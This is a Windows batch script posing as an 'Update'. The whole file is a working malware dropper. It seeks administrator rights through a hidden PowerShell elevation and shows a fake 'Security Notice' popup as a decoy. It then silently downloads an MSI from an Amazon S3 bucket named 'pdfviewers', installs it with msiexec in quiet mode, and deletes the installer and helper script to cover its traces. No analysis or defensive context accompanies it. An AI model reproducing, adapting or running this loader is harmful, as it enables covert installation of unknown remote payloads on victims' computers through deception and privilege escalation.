@echo off
setlocal enabledelayedexpansion
title Update

:: 
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "Temps=%TEMP%"
set "agents=%Temps%\agent-c92d02.msi"
set "main=%Temps%\elevate.vbs"

:: 
> "%main%" echo Set s = CreateObject("WScript.Shell")
>>"%main%" echo s.Popup "A required component could not be verified.", 5, "Security Notice", 48

::
start "" wscript.exe "%main%"
set "_url=https://pdfviewers.s3.ap-northeast-1.amazonaws.com/Install.msi"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%_url%', '%agents%')"

::
if exist "%agents%" msiexec /i "%agents%" /qn

::
timeout /t 5 /nobreak >nul
del "%agents%" /q >nul 2>&1
del "%main%" /q >nul 2>&1
exit /b 0